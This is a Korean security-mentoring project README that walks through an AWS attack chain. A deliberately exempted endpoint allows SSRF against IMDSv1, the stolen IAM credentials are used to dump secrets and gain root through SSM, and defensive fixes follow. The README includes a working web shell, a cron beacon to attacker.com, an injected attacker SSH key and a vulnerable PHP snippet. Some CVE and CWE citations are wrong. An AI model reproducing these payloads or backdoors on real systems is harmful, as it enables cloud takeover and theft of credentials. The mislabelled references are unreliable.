# AWS IMDSv1 취약점 공격 체인 프로젝트

**멘티**: 황준하
**희망분야**: AWS 클라우드 보안
**프로젝트 기간**: 2025년 11월
**멘토링**: 보안 전문가 현직자 멘토링 프로그램

---

## 📋 프로젝트 개요

본 프로젝트는 **타겟 서버에 의도적으로 취약점을 생성하고, 이를 통해 AWS 클라우드 인프라 전체를 장악하는 공격 체인을 시연**한 보안 연구 프로젝트입니다.

### 핵심 시나리오

**완벽해 보이는 보안 시스템**:
- ✅ ModSecurity WAF (웹 애플리케이션 방화벽)
- ✅ Splunk SIEM (보안 이벤트 모니터링)
- ✅ PHP disable_functions (위험 함수 비활성화)

**의도적으로 생성한 작은 취약점**:
- ❌ `/api/health.php` 엔드포인트를 ModSecurity 예외로 설정
- ❌ 이유: "서버 모니터링에 필요하다"는 명목
- ❌ AWS IMDSv1 활성화 (IMDSv2 미적용)

**결과**:
- 🔥 WAF 완전 우회
- 🔥 SSRF → AWS IAM Credentials 탈취
- 🔥 클라우드 인프라 완전 장악

---

## 📂 프로젝트 구조

```
CLEAN_PROJECT/
│
├── 01_AWS_IMDS_Attack/              # Phase 1: 취약점 생성 및 Credentials 탈취
│   ├── 119_setup_aws_vuln.sh        # 타겟 서버에 취약점 생성
│   ├── 120_aws_imds_exploit.py      # SSRF를 통한 IAM Credentials 탈취
│   ├── 121_aws_privilege_escalation.py  # AWS 인프라 열거
│   └── 122_aws_ssm_command.py       # SSM 원격 명령 실행
│
├── 02_Site_Defacement/              # Phase 2: 웹사이트 변조
│   ├── TOGGLE_SILENT.sh             # 정상/해킹 사이트 토글
│   └── SILENT_DOWNLOAD.sh           # 자동 악성코드 다운로드
│
├── 03_Documentation/                # Phase 3: 상세 문서
│   └── COMPLETE_ATTACK_ANALYSIS.md  # 전체 공격 체인 완전 분석
│
├── 04_Evidence/                     # Phase 4: 공격 증거
│   └── (탈취한 credentials, 스크린샷 등)
│
└── README.md                        # 이 파일
```

---

## 🎯 공격 체인 흐름

### 사전 준비: 스크립트 전송

**목적**: 로컬에서 작성한 스크립트를 타겟 서버로 전송

**방법 1: SCP를 사용한 파일 전송**

```bash
# 단일 파일 전송
scp SILENT_DOWNLOAD.sh ec2-user@TARGET_IP:/home/ec2-user/

# 여러 파일 동시 전송
scp SILENT_DOWNLOAD.sh TOGGLE_SILENT.sh ec2-user@TARGET_IP:/home/ec2-user/

# 디렉토리 전체 전송
scp -r 02_Site_Defacement/ ec2-user@TARGET_IP:/home/ec2-user/

# PEM 키를 사용한 전송 (AWS EC2)
scp -i ~/.ssh/your-key.pem SILENT_DOWNLOAD.sh ec2-user@TARGET_IP:/home/ec2-user/
```

**방법 2: SCP 실행 예시 (대상 서버 주소 입력)**

```bash
# 1. 대상 서버 주소 설정
TARGET_SERVER="3.35.22.248"  # 또는 도메인 (예: example.com)
SSH_KEY="~/.ssh/your-key.pem"
SSH_USER="ec2-user"

# 2. Site Defacement 스크립트 전송
cd /Users/hwangjunha/Desktop/Red_basic_local/H/CLEAN_PROJECT/02_Site_Defacement/
scp -i $SSH_KEY SILENT_DOWNLOAD.sh TOGGLE_SILENT.sh $SSH_USER@$TARGET_SERVER:/home/$SSH_USER/

# 3. 서버에 접속하여 실행 권한 부여
ssh -i $SSH_KEY $SSH_USER@$TARGET_SERVER
chmod +x SILENT_DOWNLOAD.sh TOGGLE_SILENT.sh

# 4. 스크립트 실행
sudo ./SILENT_DOWNLOAD.sh
# 프롬프트: 🎯 대상 서버 주소 (IP 또는 도메인): 3.35.22.248
```

**방법 3: 원격 서버에서 직접 작성**

```bash
# SSH로 접속
ssh -i ~/.ssh/your-key.pem ec2-user@TARGET_IP

# vim/nano로 직접 작성
sudo vim /home/ec2-user/SILENT_DOWNLOAD.sh

# 실행 권한 부여
chmod +x SILENT_DOWNLOAD.sh
```

**주의사항**:
- 스크립트 실행 시 대상 서버 주소를 **동적으로 입력**받도록 개선됨
- 매일 바뀌는 IP나 도메인에 대응 가능
- 전송 전 서버 SSH 접근 권한 확인 필요

---

### Phase 0: 타겟 서버에 취약점 생성

**스크립트**: `01_AWS_IMDS_Attack/119_setup_aws_vuln.sh`

**실행 위치**: 타겟 EC2 서버 (SSH 접속 필요)

**수행 작업**:
1. EC2 Instance ID 및 Region 확인
2. **IMDSv1 활성화** (취약점 생성):
   ```bash
   aws ec2 modify-instance-metadata-options \
       --instance-id i-08f3cc62a529c9daf \
       --http-tokens optional \    # ← IMDSv1 허용 (취약)
       --http-endpoint enabled \
       --region ap-northeast-2
   ```

3. **Health check 엔드포인트 생성** (`/api/health.php`):
   ```php
   case 'metadata':
       $url = $_GET['url'];
       $response['metadata'] = shell_exec("curl -s -m 5 " . escapeshellarg($url));
   ```

4. **ModSecurity 예외 추가** (치명적):
   ```apache
   <LocationMatch "/api/health\.php">
       SecRuleEngine Off    # ← WAF 완전 우회
   </LocationMatch>
   ```

**결과**:
- SSRF 취약점 생성 완료
- WAF 우회 경로 확보
- IMDSv1 접근 가능

---

### Phase 1: SSRF를 통한 IAM Credentials 탈취

**스크립트**: `01_AWS_IMDS_Attack/120_aws_imds_exploit.py`

**실행 위치**: 공격자 로컬 PC

**공격 흐름**:

1. **Health check 엔드포인트 확인**:
   ```python
   GET http://52.79.240.83/api/health.php
   ```
   응답:
   ```json
   {"status": "ok", "timestamp": 1731767234}
   ```

2. **SSRF 취약점 확인**:
   ```python
   GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/
   ```
   응답:
   ```json
   {"metadata": "ami-id\ninstance-id\n..."}
   ```

3. **IAM Role 이름 획득**:
   ```python
   url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
   role_name = execute_ssrf(url)  # → "MyEC2Role"
   ```

4. **IAM Credentials 탈취**:
   ```python
   url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
   creds = execute_ssrf(url)
   ```

   획득한 정보:
   ```json
   {
     "AccessKeyId": "ASIASO4TYV4OK2MJVZDV",
     "SecretAccessKey": "7H1nyRK6iZ80K2Tthpq7RhQVGCD+HNyjcsg4QfIE",
     "Token": "IQoJb3JpZ2luX2VjEMf...",
     "Expiration": "2025-11-16T11:05:33Z"
   }
   ```

5. **Credentials 저장**:
   ```bash
   # aws_stolen_1731767234.sh 생성
   export AWS_ACCESS_KEY_ID="ASIASO4TYV4OK2MJVZDV"
   export AWS_SECRET_ACCESS_KEY="7H1nyRK..."
   export AWS_SESSION_TOKEN="IQoJb3J..."
   ```

**결과**:
- ✅ AWS 인프라 접근 권한 획득
- ✅ EC2, S3, RDS 등 모든 리소스 접근 가능

---

### Phase 2: AWS 인프라 열거 및 권한 확장

**스크립트**: `01_AWS_IMDS_Attack/121_aws_privilege_escalation.py`

**실행 위치**: 공격자 로컬 PC

**수행 작업**:

1. **신원 확인**:
   ```python
   sts = boto3.client('sts')
   identity = sts.get_caller_identity()
   ```
   출력:
   ```json
   {
     "Account": "123456789012",
     "Arn": "arn:aws:sts::123456789012:assumed-role/MyEC2Role/i-08f3cc62a529c9daf"
   }
   ```

2. **EC2 인스턴스 열거**:
   ```python
   ec2 = boto3.client('ec2')
   instances = ec2.describe_instances()
   ```
   발견:
   - Web Server (현재 인스턴스)
   - Admin Server
   - Database Server

3. **S3 버킷 탐색**:
   ```python
   s3 = boto3.client('s3')
   buckets = s3.list_buckets()
   ```
   발견:
   - backup-bucket (database-backup.sql)
   - logs-bucket (application.log)
   - config-bucket (.env 파일)

4. **Secrets Manager 탈취**:
   ```python
   secrets = secretsmanager.list_secrets()
   for secret in secrets:
       value = secretsmanager.get_secret_value(SecretId=secret['ARN'])
   ```
   발견:
   - DB_PASSWORD
   - STRIPE_API_KEY
   - JWT_SECRET

**결과**:
- ✅ 모든 AWS 리소스 목록 확보
- ✅ 민감 정보 (비밀번호, API 키) 탈취

---

### Phase 3: 시스템 완전 장악

**스크립트**: `01_AWS_IMDS_Attack/122_aws_ssm_command.py`

**실행 위치**: 공격자 로컬 PC

**수행 작업**:

1. **SSM을 통한 원격 명령 실행**:
   ```python
   ssm = boto3.client('ssm')
   ssm.send_command(
       InstanceIds=['i-08f3cc62a529c9daf'],
       DocumentName='AWS-RunShellScript',
       Parameters={'commands': ['whoami']}
   )
   ```
   출력: `root`

2. **웹사이트 변조**:
   ```bash
   cat > /var/www/html/www/index.php << 'EOF'
   <h1>SYSTEM COMPROMISED</h1>
   <p>AWS IMDSv1 vulnerability exploited</p>
   EOF
   ```

3. **백도어 설치**:
   ```bash
   # 웹셸
   cat > /var/www/html/www/.backdoor.php << 'EOF'
   <?php system($_GET['cmd']); ?>
   EOF

   # Cron job
   (crontab -l; echo "*/5 * * * * curl http://attacker.com/beacon") | crontab -

   # SSH 키
   echo "ssh-rsa AAAAB3... attacker@kali" >> /root/.ssh/authorized_keys
   ```

**결과**:
- ✅ 웹사이트 변조 완료
- ✅ 지속적인 접근 경로 확보
- ✅ 전체 시스템 장악

---

## 🔍 핵심 취약점 분석

### 취약점 #1: ModSecurity WAF 예외 설정

**위험도**: ⚠️ CRITICAL

**설정 위치**: `/etc/httpd/conf.d/mod_security.conf`

**취약한 코드**:
```apache
<LocationMatch "/api/health\.php">
    SecRuleEngine Off    # ← 모든 WAF 규칙 비활성화
</LocationMatch>
```

**왜 위험한가**:
- 모든 웹 공격 (SSRF, SQLi, XSS) 탐지 불가
- 공격자가 `/api/health.php`만 발견하면 자유롭게 공격 가능

**CVE/CWE**:
- CWE-756: Missing Custom Error Page
- CWE-209: Information Exposure Through an Error Message

---

### 취약점 #2: SSRF (Server-Side Request Forgery)

**위험도**: ⚠️ CRITICAL

**설정 위치**: `/var/www/html/www/api/health.php`

**취약한 코드**:
```php
case 'metadata':
    $url = $_GET['url'];
    $response['metadata'] = shell_exec("curl -s -m 5 " . escapeshellarg($url));
```

**공격 방법**:
```
GET /api/health.php?check=metadata&url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
```

**왜 위험한가**:
- `escapeshellarg()`는 SSRF를 막지 못함
- 내부 리소스 (IMDS, localhost, 내부 네트워크) 접근 가능

**CVE/CWE**:
- CWE-918: Server-Side Request Forgery (SSRF)
- OWASP Top 10 2021: A10 - Server-Side Request Forgery

---

### 취약점 #3: AWS IMDSv1 활성화

**위험도**: ⚠️ CRITICAL

**AWS 설정**:
```bash
--http-tokens optional    # ← IMDSv1 허용 (취약)
```

**공격 방법**:
```bash
# 인증 없이 접근 가능
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
```

**왜 위험한가**:
- 인증 없이 IAM Credentials 접근
- SSRF 공격에 취약

**CVE/CWE**:
- CVE-2019-5736: SSRF via AWS IMDS
- CWE-306: Missing Authentication for Critical Function

---

## 🛡️ 방어 기법

### 즉시 조치 (24시간 내)

1. **IMDSv2 강제 활성화**:
   ```bash
   aws ec2 modify-instance-metadata-options \
       --instance-id i-08f3cc62a529c9daf \
       --http-tokens required \    # ← IMDSv2만 허용
       --region ap-northeast-2
   ```

2. **ModSecurity 예외 제거**:
   ```apache
   # /etc/httpd/conf.d/mod_security.conf
   # <LocationMatch "/api/health\.php">
   #     SecRuleEngine Off    # ← 삭제!
   # </LocationMatch>
   ```

3. **SSRF 입력 검증**:
   ```php
   // 화이트리스트 방식
   $allowed_hosts = ['api.example.com'];
   $parsed = parse_url($_GET['url']);
   if (!in_array($parsed['host'], $allowed_hosts)) {
       die('Invalid host');
   }

   // 내부 IP 차단
   $ip = gethostbyname($parsed['host']);
   if (preg_match('/^169\.254\./', $ip)) {
       die('IMDS blocked');
   }
   ```

---

## 📊 영향 평가

### 기술적 영향

| 보안 속성 | 심각도 | 상세 |
|----------|--------|------|
| **기밀성** | ⚠️ CRITICAL | AWS Credentials, 고객 데이터 완전 노출 |
| **무결성** | ⚠️ CRITICAL | 웹사이트 변조, 시스템 파일 수정 |
| **가용성** | ⚠️ HIGH | 서비스 중단, 랜섬웨어 설치 가능 |

### 비즈니스 영향

- **재정적 손실**: 서비스 중단, 복구 비용, 법적 벌금
- **명성 손상**: 고객 이탈, 브랜드 이미지 하락
- **법적 벌금**: GDPR (€20M), 개인정보보호법 (5억원)

### 실제 사례

- **Capital One (2019)**: SSRF + IMDSv1 → 1억 고객 정보 유출 → 벌금 $80M
- **Tesla (2018)**: K8s + IMDSv1 → 크립토마이닝

---

## 📚 상세 문서

전체 공격 체인의 **코드 레벨 상세 분석**은 다음 문서를 참고하세요:

**[COMPLETE_ATTACK_ANALYSIS.md](./03_Documentation/COMPLETE_ATTACK_ANALYSIS.md)**

포함 내용:
- 각 스크립트의 코드 레벨 분석
- HTTP 요청/응답 상세
- 취약점 트리거 메커니즘
- 방어 기법 상세
- 실제 사례 분석

---

## 🎓 핵심 교훈

### 1. "완벽한 보안"은 환상이다

```
99% 보안 + 1% 작은 틈 = 0% 보안
```

### 2. 편의성 vs 보안

"모니터링에 필요해서" → ModSecurity 예외 → 전체 시스템 무너짐

### 3. Defense in Depth

한 계층이 뚫려도 다음 계층에서 막아야 함

### 4. 입력은 절대 신뢰하지 마라

모든 사용자 입력 = 악의적

---

## ⚠️ 면책 조항

**법적 고지**:
- 모든 테스트는 **허가된 환경**에서 수행
- 실제 운영 시스템에 적용 **절대 금지**
- 교육 및 연구 목적으로만 사용
- 무단 사용 시 법적 책임

**관련 법률**:
- 정보통신망법 위반 시 최대 5년 이하 징역
- 전자금융거래법 위반 시 최대 10년 이하 징역

---

**멘티**: 황준하
**희망분야**: AWS 클라우드 보안
**학습 기간**: 2025년 11월
**멘토링**: 보안 전문가 현직자 멘토링 프로그램

**GitHub**: [Repository Link]
**문의**: [Contact]
